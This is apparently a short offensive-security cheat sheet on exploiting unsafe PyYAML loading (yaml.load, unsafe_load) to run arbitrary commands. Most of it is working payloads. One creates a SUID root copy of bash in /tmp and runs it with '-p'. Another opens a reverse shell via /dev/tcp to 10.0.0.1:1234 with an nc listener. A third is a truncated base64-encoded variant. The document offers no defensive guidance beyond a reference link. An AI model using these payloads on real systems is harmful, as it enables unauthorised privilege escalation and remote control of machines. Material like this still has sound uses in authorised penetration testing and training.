# Python Yaml Privilege Escalation

Python Yaml package is vulnerable to execute arbitrary command.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
import yaml

filename = "example.yml"
yaml.load()
```

### Payloads <a href="#payloads" id="payloads"></a>

```shellscript
import yaml
from yaml import Loader, UnsafeLoader

data = b'!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]'
yaml.load(data)
yaml.load(data, Loader=Loader)
yaml.load(data, Loader=UnsafeLoader)
yaml.load_all(data)
yaml.load_all(data, Loader=Loader)
yaml.load_all(data, Loader=UnsafeLoader)
yaml.unsafe_load(data)
```

Now execute the **`bash`** in privilege mode.

```shellscript
/tmp/bash -p
```

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

Start a listener in local machine.

```shellscript
nc -lvnp 1234
```

Then execute Python script that contains the following `YAML` code as root.

```shellscript
import yaml
yaml.load('!!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'])
```

#### Base64 Encoding <a href="#base64-encoding" id="base64-encoding"></a>

Sometimes we might be able to remote code execution by using Base64 encoded payload.

```shellscript
yaml.load(b64decode(b"ISFweXRa...YXNoIl0="))
```

### References <a href="#references" id="references"></a>

* [pyyaml](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load\(input\)-Deprecation)
